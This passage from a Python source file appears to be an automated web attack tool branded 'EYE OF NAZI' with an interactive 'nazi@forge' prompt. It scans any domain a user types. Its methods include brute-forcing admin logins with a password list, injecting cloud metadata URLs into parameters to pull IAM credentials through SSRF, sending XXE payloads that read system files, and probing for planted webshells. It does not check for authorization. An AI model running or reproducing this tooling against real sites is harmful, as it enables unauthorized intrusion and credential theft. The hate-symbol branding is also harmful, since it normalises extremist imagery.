            for m in re.finditer(pat, rj['t'], re.IGNORECASE):
                secret = m.group(0)[:100]
                self.add(full, '', 'SECRET', secret, "Secret in JS", "HIGH")
                found += 1; break
    if found == 0: print(f"  \033[92m[+]\033[0m No secrets in JS")

def analyze_cookies(self, url):
    print(f"\n\033[96m[*]\033[0m Cookie Analysis...")
    r = self.cl.req(url)
    if r['err']: return
    cookies = r['h'].get('Set-Cookie', '') or r['h'].get('set-cookie', '')
    if not cookies:
        print(f"  \033[93m[!]\033[0m No cookies")
        return
    for c in cookies.split(','):
        c = c.strip()
        if not c: continue
        name = c.split('=')[0].strip() if '=' in c else c
        print(f"  \033[92m[+]\033[0m Cookie: {name[:50]}")
        issues = []
        if 'httponly' not in c.lower(): issues.append('No HttpOnly')
        if 'secure' not in c.lower(): issues.append('No Secure')
        if 'samesite' not in c.lower(): issues.append('No SameSite')
        if issues:
            self.add(url, '', 'SECRET', '', f"{name}: {', '.join(issues)}", "MEDIUM")

def check_redirects(self, url):
    print(f"\n\033[96m[*]\033[0m Redirect Chain...")
    chain = []
    cur = url
    for _ in range(10):
        r = self.cl.req(cur)
        if r['err']: break
        chain.append((cur, r['s']))
        if r['s'] in (301, 302, 303, 307, 308):
            loc = r['h'].get('Location', '') or r['h'].get('location', '')
            if loc:
                cur = urllib.parse.urljoin(cur, loc); continue
        break
    for u, s in chain:
        print(f"  \033[92m[+]\033[0m {s} -> {u[:80]}")
    if len(chain) > 3:
        self.add(url, '', 'REDIR', '', f"Chain: {len(chain)}", "MEDIUM")

def parse_robots(self, url):
    print(f"\n\033[96m[*]\033[0m Robots.txt Parser...")
    robots_url = url.rstrip('/') + '/robots.txt'
    r = self.cl.req(robots_url)
    if r['err'] or r['s'] != 200:
        print(f"  \033[93m[!]\033[0m No robots.txt")
        return
    disallowed = []
    for line in r['t'].split('\n'):
        if line.lower().startswith('disallow:'):
            path = line.split(':', 1)[1].strip()
            if path and path != '/':
                disallowed.append(path)
    for p in disallowed[:20]:
        self.add(robots_url, '', 'PATH', '', f"Disallowed: {p}", "INFO")
    print(f"  \033[92m[+]\033[0m Found {len(disallowed)} disallowed")

def check_cors(self, url):
    print(f"\n\033[96m[*]\033[0m CORS Misconfiguration...")
    for origin in ['https://evil.com', 'null']:
        r = self.cl.req(url, headers={'Origin': origin})
        if r['err']: continue
        acao = r['h'].get('Access-Control-Allow-Origin', '') or r['h'].get('access-control-allow-origin', '')
        acac = r['h'].get('Access-Control-Allow-Credentials', '') or r['h'].get('access-control-allow-credentials', '')
        if acao == origin or acao == '*':
            sev = "HIGH" if acac.lower() == 'true' else "MEDIUM"
            self.add(url, '', 'CORS', origin, f"ACAO:{acao} ACAC:{acac}", sev); break

def check_race(self, url):
    print(f"\n\033[96m[*]\033[0m Race Condition...")
    def send(): 
        try: return self.cl.req(url)
        except: return None
    with ThreadPoolExecutor(max_workers=10) as ex:
        results = []
        for fut in as_completed([ex.submit(send) for _ in range(10)]):
            try:
                res = fut.result()
                if res and not res['err']: results.append(res['s'])
            except: pass
    if results and len(set(results)) > 1:
        self.add(url, '', 'RACE', '', f"{len(set(results))} responses", "MEDIUM")

def save_json(self, filename):
    data = {'target': self.url, 'time': datetime.now().isoformat(),
            'techs': self.techs, 'waf': self.waf,
            'emails': list(self.emails), 'secrets': self.secrets,
            'cves': self.cves, 'findings': self.f}
    with open(filename, 'w', encoding='utf-8') as fp:
        json.dump(data, fp, indent=2, ensure_ascii=False)
    print(f"\033[92m[+]\033[0m JSON saved: {filename}")

def save_html(self, filename):
    html = '<!DOCTYPE html><html><head><meta charset="UTF-8">'
    html += f'<title>Report - {self.url}</title>'
    html += '<style>body{font-family:Arial;background:#0a0a0f;color:#f5f5f7;padding:20px;}'
    html += 'h1{color:#ef4444;}.finding{background:#1a1a25;border-right:4px solid #8b5cf6;padding:15px;margin:10px 0;border-radius:8px;}'
    html += '.CRITICAL{border-color:#ef4444;}.HIGH{border-color:#f59e0b;}'
    html += '.MEDIUM{border-color:#eab308;}.LOW{border-color:#6b7280;}.INFO{border-color:#3b82f6;}'
    html += 'code{background:#27272a;padding:2px 6px;border-radius:4px;}</style></head><body>'
    html += '<h1>EYE OF NAZI - Report</h1>'
    html += f'<p><strong>Target:</strong> <code>{self.url}</code></p>'
    html += f'<p><strong>Total:</strong> {len(self.f)}</p><hr>'
    for f in self.f:
        html += f'<div class="finding {f["severity"]}">'
        html += f'<strong>{f["severity"]} - {f["type"]}</strong>'
        html += f'<p><code>{f["url"]}</code></p>'
        html += f'<p>{f["evidence"]}</p></div>'
    html += '</body></html>'
    with open(filename, 'w', encoding='utf-8') as fp:
        fp.write(html)
    print(f"\033[92m[+]\033[0m HTML saved: {filename}")
def detect_shell(self, base):
    print(f"\n\033[96m[*]\033[0m Shell Detector ({len(SHELL_FILES)})...")
    for sf in SHELL_FILES:
        url = base.rstrip('/') + '/' + sf
        r = self.cl.req(url)
        if not r['err'] and r['s'] == 200:
            if any(x in r['t'].lower() for x in ['cmd', 'exec', 'system', 'shell_exec', 'passthru']):
                self.add(url, '', 'SHELL', '', "Shell file detected!", "CRITICAL")

def cloud_metadata(self, url):
    print(f"\n\033[96m[*]\033[0m Cloud Metadata...")
    meta_urls = [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://100.100.100.200/latest/meta-data/',
    ]
    for p in self.params(url):
        for mu in meta_urls:
            r = self.cl.req(self.inject(url, p, mu))
            if r['err']: continue
            for ind in ['ami-id', 'instance-id', 'access_key', 'secret_key', 'computeMetadata']:
                if ind in r['t']:
                    self.add(url, p, 'CLOUD', mu, f"Cloud metadata: {ind}", "CRITICAL"); break

def brute_login(self, url):
    print(f"\n\033[96m[*]\033[0m Login Brute Force...")
    base = url.rstrip('/')
    login_paths = ['wp-login.php', 'admin/login.php', 'admin/login', 'login.php']
    for lp in login_paths:
        login_url = base + '/' + lp
        r = self.cl.req(login_url)
        if r['err'] or r['s'] not in (200, 401, 403): continue
        print(f"  \033[92m[+]\033[0m Login page: {login_url}")
        for pwd in BRUTE_PASSWORDS[:5]:
            for usr in ['admin', 'administrator', 'root']:
                try:
                    data = urllib.parse.urlencode({'log': usr, 'pwd': pwd, 'wp-submit': 'Log In'}).encode()
                    r2 = self.cl.req(login_url, data=data, method='POST')
                    if not r2['err'] and (r2['s'] == 302 or 'wordpress_logged_in' in str(r2['h']).lower()):
                        cred = f"{usr}:{pwd}"
                        self.add(login_url, '', 'BRUTE', cred, "Login successful!", "CRITICAL")
                        break
                except: pass

def check_xxe(self, url):
    print(f"\n\033[96m[*]\033[0m XXE Detection...")
    for xxe in PAYLOADS['xxe']:
        try:
            data = xxe.encode()
            r = self.cl.req(url, data=data, headers={'Content-Type': 'application/xml'})
            if not r['err'] and ('root:x:0:0' in r['t'] or 'for 16-bit' in r['t']):
                self.add(url, '', 'XXE', xxe[:50], "XXE vulnerability", "CRITICAL"); break
        except: pass

def check_jwt(self, url):
    print(f"\n\033[96m[*]\033[0m JWT Analysis...")
    r = self.cl.req(url)
    if r['err']: return
    cookies = r['h'].get('Set-Cookie', '') or r['h'].get('set-cookie', '')
    tokens = re.findall(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', r['t'] + ' ' + cookies)
    for tok in tokens[:3]:
        try:
            header = base64.urlsafe_b64decode(tok.split('.')[0] + '==').decode('utf-8', 'ignore')
            if '"alg":"none"' in header.replace(' ', ''):
                self.add(url, '', 'JWT', tok[:50], "alg:none vulnerability", "CRITICAL")
            else:
                print(f"  \033[92m[+]\033[0m JWT: {header[:80]}")
        except: pass

def check_graphql(self, url):
    print(f"\n\033[96m[*]\033[0m GraphQL Introspection...")
    for path in ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']:
        gql = url.rstrip('/') + path
        try:
            data = '{"query":"{__schema{types{name}}}"}'.encode()
            r = self.cl.req(gql, data=data, headers={'Content-Type': 'application/json'})
            if not r['err'] and r['s'] == 200 and '__schema' in r['t']:
                self.add(gql, '', 'GRAPHQL', '', "Introspection enabled", "HIGH"); break
        except: pass

def check_hpp(self, url):
    print(f"\n\033[96m[*]\033[0m HTTP Parameter Pollution...")
    pr = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
    for p in list(qs.keys())[:3]:
        test_url = url + '&' + p + '=polluted'
        r = self.cl.req(test_url)
        if not r['err'] and 'polluted' in r['t']:
            self.add(test_url, p, 'HPP', f"{p}=polluted", "Param pollution", "MEDIUM")

def run_all(self):
    print(f"\n\033[96m{'='*65}\033[0m")
    print(f"\033[1m  [*] TARGET: {self.url}\033[0m")
    print(f"\033[96m{'='*65}\033[0m")

    print(f"\n\033[96m[1/20]\033[0m Security Headers...")
    self.check_headers(self.url)

    print(f"\n\033[96m[2/20]\033[0m Fingerprinting...")
    techs = self.fingerprint(self.url)
    if techs:
        print(f"  \033[92m[+]\033[0m {', '.join(techs)}")
        self.techs = techs

    print(f"\n\033[96m[3/20]\033[0m WAF Detection...")
    waf = self.detect_waf(self.url)
    if waf:
        print(f"  \033[93m[!]\033[0m WAF: {', '.join(waf)}")
        self.waf = waf

    print(f"\n\033[96m[4/20]\033[0m Cookie Analysis...")
    try: self.analyze_cookies(self.url)
    except: pass

    print(f"\n\033[96m[5/20]\033[0m Redirect Chain...")
    try: self.check_redirects(self.url)
    except: pass

    print(f"\n\033[96m[6/20]\033[0m CORS Misconfiguration...")
    try: self.check_cors(self.url)
    except: pass

    print(f"\n\033[96m[7/20]\033[0m URL Parameters...")
    self.nt += 1
    self.scan_url(self.url)

    print(f"\n\033[96m[8/20]\033[0m HTTP Parameter Pollution...")
    try: self.check_hpp(self.url)
    except: pass

    print(f"\n\033[96m[9/20]\033[0m Sensitive Paths ({len(PATHS)})...")
    self.scan_paths(self.url)

    print(f"\n\033[96m[10/20]\033[0m Admin Finder ({len(ADMIN_PATHS)})...")
    try: self.find_admin(self.url)
    except: pass

    print(f"\n\033[96m[11/20]\033[0m API Discovery ({len(API_ENDPOINTS)})...")
    try: self.find_api(self.url)
    except: pass

    print(f"\n\033[96m[12/20]\033[0m Backup Files ({len(BACKUP_FILES)})...")
    try: self.scan_backups(self.url)
    except: pass

    print(f"\n\033[96m[13/20]\033[0m Shell Detector...")
    try: self.detect_shell(self.url)
    except: pass

    print(f"\n\033[96m[14/20]\033[0m Crawling...")
    try: self.crawl(self.url, depth=1)
    except: pass

    print(f"\n\033[96m[15/20]\033[0m JavaScript Analysis...")
    try: self.analyze_js(self.url)
    except: pass

    print(f"\n\033[96m[16/20]\033[0m JavaScript Secrets...")
    try: self.analyze_js_secrets(self.url)
    except: pass

    print(f"\n\033[96m[17/20]\033[0m XXE Detection...")
    try: self.check_xxe(self.url)
    except: pass

    print(f"\n\033[96m[18/20]\033[0m JWT Analysis...")
    try: self.check_jwt(self.url)
    except: pass

    print(f"\n\033[96m[19/20]\033[0m GraphQL Introspection...")
    try: self.check_graphql(self.url)
    except: pass

    print(f"\n\033[96m[20/20]\033[0m Cloud Metadata...")
    try: self.cloud_metadata(self.url)
    except: pass

    print(f"\n\033[96m[+]\033[0m HTTP Methods...")
    try: self.check_http_methods(self.url)
    except: pass

    print(f"\n\033[96m[+]\033[0m SSL/TLS Audit...")
    try: self.check_ssl(self.url)
    except: pass

    host = urllib.parse.urlparse(self.url).hostname
    if host:
        print(f"\n\033[96m[+]\033[0m Subdomains...")
        try: self.enum_subdomains(host)
        except: pass

        print(f"\n\033[96m[+]\033[0m Port Scanning...")
        try: self.scan_ports(host)
        except: pass

        print(f"\n\033[96m[+]\033[0m DNS Records...")
        try: self.check_dns(host)
        except: pass

        print(f"\n\033[96m[+]\033[0m Whois Lookup...")
        try: self.check_whois(host)
        except: pass

    print(f"\n\033[96m[+]\033[0m CVE Detection...")
    try: self.check_cve(self.url, self.techs)
    except: pass

    print(f"\n\033[96m[+]\033[0m Robots.txt...")
    try: self.parse_robots(self.url)
    except: pass

    print(f"\n\033[96m{'='*65}\033[0m")
    crit = sum(1 for f in self.f if f['severity'] == 'CRITICAL')
    high = sum(1 for f in self.f if f['severity'] == 'HIGH')
    med = sum(1 for f in self.f if f['severity'] == 'MEDIUM')
    low = sum(1 for f in self.f if f['severity'] == 'LOW')
    print(f"  URLs: {self.nt} | Params: {self.np} | Paths: {self.npath} | Crawled: {len(self.crawled)}")
    print(f"  Emails: {len(self.emails)} | Secrets: {len(self.secrets)} | CVEs: {len(self.cves)}")
    print(f"  Findings: \033[1m\033[91m{len(self.f)}\033[0m")
    print(f"    \033[41m\033[97m CRITICAL \033[0m {crit}")
    print(f"    \033[43m HIGH     \033[0m {high}")‌
    print(f"    \033[93m MEDIUM   \033[0m {med}")
    print(f"    \033[2m LOW      \033[0m {low}")
    print(f"\033[96m{'='*65}\033[0m\n")

# ═══════════════════════════════════════════════════════════════════════════
# AUTO-DETECT + MAIN
# ═══════════════════════════════════════════════════════════════════════════

def is_url(text):
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$', text):
        return True
    if text.startswith(('http://', 'https://')):
        return True
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text):
        return True
    if text.startswith('localhost'):
        return True
    return False


def normalize_url(text):
    if not text.startswith(('http://', 'https://')):
        text = 'http://' + text
    return text


def main():
    print(LOGO)
    print(f"\n\033[96m{'='*80}\033[0m")
    print(f"\033[92m  Ready. Type a domain (e.g. kurd4u.com).\033[0m")
    print(f"\033[96m{'='*80}\033[0m")
    print(f"\n\033[93mAccepted formats:\033[0m")
    print(f"  \033[92mkurd4u.com\033[0m              - Domain only")
    print(f"  \033[92mhttps://kurd4u.com\033[0m      - With protocol")
    print(f"  \033[92mhttp://kurd4u.com/path\033[0m  - Full URL")
    print(f"  \033[92m192.168.1.1\033[0m             - IP address")
    print(f"  \033[92mlocalhost\033[0m               - Localhost")
    print(f"\n\033[93mOther commands:\033[0m")
    print(f"  \033[92mcookie <value>\033[0m   - Set cookie")
    print(f"  \033[92mproxy <URL>\033[0m      - Set proxy")
    print(f"  \033[92mthreads <N>\033[0m      - Set thread count")
    print(f"  \033[92msave <file>\033[0m      - Save last scan as JSON")
    print(f"  \033[92msavehtml <file>\033[0m  - Save last scan as HTML")
    print(f"  \033[92mstatus\033[0m           - Show current settings")
    print(f"  \033[92mclear\033[0m            - Clear screen")
    print(f"  \033[92mexit\033[0m             - Quit\n")

    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last_scan': None}

    while True:
        try:
            line = input(f"\033[1m\033[92mnazi\033[0m\033[93m@\033[0m\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd in ('exit', 'quit', 'q'):
            print(f"\033[93mBye.\033[0m")
            break
        elif cmd == 'help':
            print("Type a domain (e.g. kurd4u.com) or: cookie, proxy, threads, save, savehtml, status, clear, exit")
        elif cmd == 'cookie':
            if arg: st['cookie'] = arg; print(f"\033[92m[+] Cookie set\033[0m")
            else: print(f"\033[91m[!] cookie <value>\033[0m")
        elif cmd == 'proxy':
            if arg: st['proxy'] = arg; print(f"\033[92m[+] Proxy set\033[0m")
            else: print(f"\033[91m[!] proxy <URL>\033[0m")
        elif cmd == 'threads':
            if arg:
                try: st['threads'] = int(arg); print(f"\033[92m[+] Threads: {arg}\033[0m")
                except: print(f"\033[91m[!] threads <number>\033[0m")
            else: print(f"\033[91m[!] threads <number>\033[0m")
        elif cmd == 'status':
            print(f"\n\033[96mSettings:\033[0m")
            print(f"  Cookie  : {st['cookie'] or '(none)'}")
            print(f"  Proxy   : {st['proxy'] or '(none)'}")
            print(f"  Threads : {st['threads']}\n")
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)
        elif cmd == 'save':
            if not st['last_scan']: print(f"\033[91m[!] No scan yet\033[0m")
            elif not arg: print(f"\033[91m[!] save <filename>\033[0m")
            else: st['last_scan'].save_json(arg)
        elif cmd == 'savehtml':
            if not st['last_scan']: print(f"\033[91m[!] No scan yet\033[0m")
            elif not arg: print(f"\033[91m[!] savehtml <filename>\033[0m")
            else: st['last_scan'].save_html(arg)
        elif is_url(cmd):
            url = normalize_url(cmd)
            print(f"\n\033[93m[?]\033[0m FULL AUTO SCAN: \033[1m{url}\033[0m")
            print(f"\033[93m[!]\033[0m This will take 15-30 minutes. Press Ctrl+C to stop.")
            conf = input(f"\033[93m    Start? (y/n): \033[0m").strip().lower()
            if conf not in ('y', 'yes', ''): continue
            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
            sc = Scan(url, cl, threads=st['threads'])
            try:
                sc.run_all()
                st['last_scan'] = sc
            except KeyboardInterrupt:
                print(f"\n\033[93m[!] Stopped\033[0m")
                st['last_scan'] = sc
            except Exception as e:
                print(f"\n\033[91m[!] Error: {e}\033[0m")
        else:
            print(f"\033[91m[!] Unknown: {cmd}\033[0m")
            print(f"\033[93m    Type a domain (e.g. kurd4u.com) or 'help'\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[91m[!] Fatal error: {e}\033[0m")
        sys.exit(1)
